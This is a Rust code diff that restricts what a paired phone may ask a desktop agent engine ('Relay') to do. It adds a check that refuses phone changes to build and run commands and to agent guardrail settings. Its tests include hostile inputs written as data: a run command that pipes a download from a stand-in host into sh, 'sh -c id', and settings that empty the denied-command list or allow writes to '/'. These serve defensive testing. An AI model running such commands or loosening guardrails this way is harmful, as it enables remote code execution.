@@ -135,9 +135,9 @@ pub const PHONE_OPS: &[&str] = &[
     // pause, and its facts to confirm or forget. Its settings stay on the PC, so a lost phone
     // cannot point it at another server or open private data to Claude.
     "aide.chat", "aide.errand.list", "aide.errand.update", "aide.fact.forget", "aide.fact.list", "aide.fact.update",
-    "aide.job.get", "aide.job.list", "aide.job.set", "aide.message.list", "aide.run.list", "aide.run.now",
+    "aide.job.delete", "aide.job.get", "aide.job.list", "aide.job.set", "aide.message.list", "aide.run.now",
     "aide.run.stop", "aide.summary",
-    "app.backup.list", "app.backup.now", "app.resources.watch",
+    "app.backup.list", "app.backup.now",
     // Arbiter on the phone: its reads, a proposal's answer, and the halt and restart keys.
     "arbiter.decision.list", "arbiter.halt", "arbiter.order.list", "arbiter.proposal.list",
     "arbiter.proposal.resolve", "arbiter.restart", "arbiter.series", "arbiter.settings.get",
@@ -162,31 +162,32 @@ pub const PHONE_OPS: &[&str] = &[
     "gym.cardio", "gym.lift.get", "gym.lifts", "gym.series", "gym.session.get", "gym.sessions",
     "gym.summary",
     "integration.discard", "integration.get", "integration.list", "integration.request",
-    "mailbox.list", "mailbox.outbox", "mailbox.send",
-    "module.changelog.draft", "module.complete", "module.create", "module.delete", "module.get",
-    "module.list", "module.reopen", "module.restore", "module.update",
+    "mailbox.list", "mailbox.send",
+    "module.complete", "module.create", "module.delete", "module.list", "module.reopen",
+    "module.restore", "module.update",
     // Tally's sync (antho976/Tally), and for the Threads space on the phone (apps/relay-android)
     // the ledger's reads, and the Undo of an entry a thread added or changed (and its Redo).
     "money.invest.delete", "money.invest.list", "money.invest.restore", "money.invest.summary",
     "money.lists", "money.series", "money.summary", "money.sync", "money.tx.delete",
     "money.tx.list", "money.tx.restore", "money.tx.update",
     "notes.append", "notes.create", "notes.delete", "notes.get", "notes.list", "notes.pin",
-    "notes.restore", "notes.standing", "notes.update",
+    "notes.restore", "notes.update",
     "notify.ack", "notify.ack_all", "notify.list", "notify.settings.get", "notify.settings.set",
     "overlap.list",
     "plugin.enable", "plugin.get", "plugin.list",
-    "project.add", "project.clone", "project.get", "project.list", "project.remove", "project.update",
+    "project.add", "project.clone", "project.list", "project.remove", "project.update",
     "provider.list", "provider.refresh", "provider.update",
     "session.attach", "session.brief", "session.clear_restorable", "session.close", "session.create",
     "session.detach", "session.discard_restorable", "session.get", "session.input", "session.list",
-    "session.park", "session.peers", "session.resize", "session.restorable", "session.resume",
+    "session.park", "session.resize", "session.restorable", "session.resume",
     "session.scrollback", "session.spawn", "session.transcript", "session.update", "session.upload",
     "session.wake",
-    "settings.get", "settings.reset",
-    "skill.create", "skill.delete", "skill.enable", "skill.get", "skill.install", "skill.list",
-    "skill.update",
-    "task.activity", "task.approve", "task.attach", "task.changelog.write", "task.children",
-    "task.comment", "task.create", "task.delete", "task.detach", "task.dispatch", "task.get",
+    "settings.reset",
+    // A skill is installed from its repository and switched per project from the phone; its text,
+    // which every agent loads, is never written from one.
+    "skill.enable", "skill.get", "skill.install", "skill.list",
+    "task.activity", "task.approve", "task.changelog.write",
+    "task.comment", "task.create", "task.delete", "task.dispatch", "task.get",
     "task.label.add", "task.label.list", "task.label.remove", "task.link_commit", "task.list",
     "task.move", "task.parent.set", "task.relate", "task.restore", "task.unapprove", "task.unrelate",
     "task.update",
@@ -197,9 +198,8 @@ pub const PHONE_OPS: &[&str] = &[
     "thread.pick", "thread.proposal.get", "thread.proposal.list", "thread.proposal.resolve",
     "thread.proposal.undo", "thread.rename", "thread.send", "thread.set", "thread.stop",
     "thread.upload",
-    "ui.page.switch",
     "usage.get",
-    "workspace.create", "workspace.discover", "workspace.list", "workspace.remove", "workspace.update",
+    "workspace.create", "workspace.discover", "workspace.list", "workspace.update",
     "worktree.list",
 ];
 
@@ -263,6 +263,25 @@ fn asks_for_api_key(value: &serde_json::Value, op: &str) -> bool {
     value.pointer(at).is_some_and(|v| !matches!(v, serde_json::Value::Bool(false) | serde_json::Value::Null))
 }
 
+/// What a request would change about the commands the engine runs on its own, outside any
+/// agent's guardrail: a project's build and run commands (an integration build and Run on device
+/// hand them to the shell as they are), and the guardrail keys that decide what agents may
+/// execute and where they may write. `None` for anything else. A `null` build or run command
+/// goes back to Relay's default and is allowed; caps, protected paths and the destructive-write
+/// thresholds stay the phone's to tune.
+fn changes_what_runs(value: &serde_json::Value, op: &str) -> Option<&'static str> {
+    let payload = &value["payload"];
+    match op {
+        "project.update" => ["build_cmd", "run_cmd"].iter().any(|key| payload.get(key).is_some_and(|v| !v.is_null()))
+            .then_some("a project's build and run commands"),
+        // Any mention, `null` included: clearing a project's own list brings back a looser one.
+        "guardrail.config.set" => ["denied_commands", "allowed_write_roots", "roles", "shape_gates", "agent_builds"]
+            .iter().any(|key| payload["patch"].get(key).is_some())
+            .then_some("the commands agents may run and the folders they may write"),
+        _ => None,
+    }
+}
+
 /// `gate_for` with the phone's list: the PC's own door.
 pub fn gate(line: &str, instance: Instance) -> Gate {
     gate_for(line, instance, OpProfile::Phone)
@@ -295,6 +314,12 @@ pub fn gate_for(line: &str, instance: Instance, profile: OpProfile) -> Gate {
         // phone: a phone builds a release, the desktop publishes it.
         BusError::refused("remote.publish", "publishing to Google Play is only from the desktop; a phone can build a release, not publish it")
             .with_hint("build it with publish off, then publish it from Relay on the PC")
+    } else if let Some(what) = (profile == OpProfile::Phone).then(|| changes_what_runs(&value, op)).flatten() {
+        // A phone credential can be lost with the phone, and these are run with no agent and no
+        // guardrail between them and the PC's shell: `project.update {run_cmd}` and then
+        // `device.run` executed whatever a phone sent.
+        BusError::refused("remote.command", format!("{what} are changed only from Relay on the PC"))
+            .with_hint("change them in the project's settings on the PC")
     } else if profile == OpProfile::Phone && asks_for_api_key(&value, op) {
         // Billed to the user's own key: whoever holds or forges a phone's link could start as
         // many as they liked. The choice is made at the PC.
@@ -365,9 +390,13 @@ mod tests {
         assert_eq!(kind("design.asset.get"), relay_bus::registry::OpKind::Query);
         // A thread's agent proposes from the PC alone.
         assert!(matches!(gate(&line("thread.propose"), Instance::Stable), Gate::Reject(_)));
+        // Aide's "Not now" removes the job it proposed.
+        assert!(matches!(gate(&line("aide.job.delete"), Instance::Stable), Gate::Forward));
         // Audit rows carry stored payloads (held actions, prompts, an old Arbiter key), and no
-        // screen of the app reads them.
-        for op in ["settings.set", "app.quit", "guardrail.grant.revoke", "worktree.remove", "os.open_url", "no.such", "audit.list", "audit.undo"] {
+        // screen of the app reads them. A skill's text is loaded by every agent: the phone
+        // installs and switches skills, and writes none.
+        for op in ["settings.set", "app.quit", "guardrail.grant.revoke", "worktree.remove", "os.open_url", "no.such", "audit.list", "audit.undo",
+            "skill.create", "skill.update", "skill.delete", "workspace.remove", "task.attach", "ui.page.switch"] {
             match gate(&line(op), Instance::Stable) {
                 Gate::Reject(resp) => assert_eq!(resp.error.unwrap().code, "remote.op"),
                 Gate::Forward => panic!("{op} forwarded"),
@@ -418,6 +447,84 @@ mod tests {
                 Gate::Forward => panic!("{op} {payload} was forwarded"),
             }
         }
+    }
+
+    #[test]
+    fn a_phone_never_changes_what_the_pc_runs() {
+        let line = |op: &str, payload: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0009","actor":"user","op":"{op}","payload":{payload}}}"#);
+        // The phone still renames, pins and re-bases a project, puts its commands back to
+        // Relay's default, tunes the guardrails' caps and thresholds, and runs on a device.
+        for (op, payload) in [
+            ("project.update", r#"{"project_id":1,"name":"Relay","base_branch":"main","pinned":true}"#),
+            ("project.update", r#"{"project_id":1,"run_cmd":null,"build_cmd":null}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"caps":{"files":80},"protected_paths":["deploy/**"],"check_on_push":true}}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"destructive_write":{"min_removed_lines":40}}}"#),
+            ("device.run", r#"{"project_id":1,"device":"emulator-5554"}"#),
+            ("session.create", r#"{"project_id":1,"provider":"claude"}"#),
+        ] {
+            assert!(matches!(gate(&line(op, payload), Instance::Stable), Gate::Forward), "{op} {payload}");
+        }
+        // `project.update {run_cmd}` and then `device.run` executed whatever the phone sent.
+        for (op, payload) in [
+            ("project.update", r#"{"project_id":1,"run_cmd":"curl -s https://example.invalid/x | sh"}"#),
+            ("project.update", r#"{"project_id":1,"name":"Relay","build_cmd":"sh -c id"}"#),
+            ("project.update", r#"{"project_id":1,"run_cmd":""}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"denied_commands":[]}}"#),
+            ("guardrail.config.set", r#"{"patch":{"allowed_write_roots":["/"]}}"#),
+            ("guardrail.config.set", r#"{"workspace_id":1,"patch":{"denied_commands":null}}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"agent_builds":true}}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"roles":{}}}"#),
+            ("guardrail.config.set", r#"{"project_id":1,"patch":{"shape_gates":[]}}"#),
+        ] {
+            match gate(&line(op, payload), Instance::Stable) {
+                Gate::Reject(resp) => {
+                    let error = resp.error.unwrap();
+                    assert_eq!(error.code, "remote.command", "{op} {payload}");
+                    assert!(error.message.contains("only from Relay on the PC"), "{}", error.message);
+                }
+                Gate::Forward => panic!("{op} {payload} was forwarded"),
+            }
+        }
+    }
+
+    /// Every op a screen of the app sends must be open at the door, or the door refuses it with
+    /// `remote.op` and the button does nothing: that is how Aide's "Not now" shipped broken. The
+    /// app's sources are read here, so this runs with the engine's tests on a change to either
+    /// side. Only an op name passed to one of the app's send helpers counts: the app also names
+    /// ops as labels for what a thread's agent did.
+    #[test]
+    fn every_op_the_app_sends_is_open_to_a_phone() {
+        let app = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../apps/relay-android");
+        let senders = ["act", "answer", "attempt", "cached", "call", "change", "live", "liveAlso", "post", "query", "rememberLive", "result", "send"];
+        let registry = relay_bus::registry::Registry::global();
+        let mut files = vec![app];
+        let mut sent = std::collections::BTreeMap::<String, String>::new();
+        while let Some(path) = files.pop() {
+            if path.is_dir() {
+                if !matches!(path.file_name().and_then(|n| n.to_str()), Some("build" | "test" | "androidTest" | ".gradle")) {
+                    files.extend(std::fs::read_dir(&path).unwrap().map(|entry| entry.unwrap().path()));
+                }
+                continue;
+            }
+            if path.extension().and_then(|e| e.to_str()) != Some("kt") {
+                continue;
+            }
+            let text = std::fs::read_to_string(&path).unwrap();
+            for (at, _) in text.match_indices('"') {
+                let Some(name) = text[at + 1..].split('"').next() else { continue };
+                if registry.get(name).is_none() {
+                    continue;
+                }
+                let before = text[..at].trim_end().strip_suffix('(').map(str::trim_end).unwrap_or("");
+                let callee = before.rsplit(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).next().unwrap_or("");
+                if senders.contains(&callee) {
+                    sent.entry(name.to_string()).or_insert_with(|| path.display().to_string());
+                }
+            }
+        }
+        assert!(sent.len() > 100, "found only {} sent ops: has the app moved?", sent.len());
+        let closed: Vec<_> = sent.iter().filter(|(op, _)| PHONE_OPS.binary_search(&op.as_str()).is_err()).collect();
+        assert!(closed.is_empty(), "the app sends ops the phone door refuses: {closed:?}");
     }
 
     #[test]
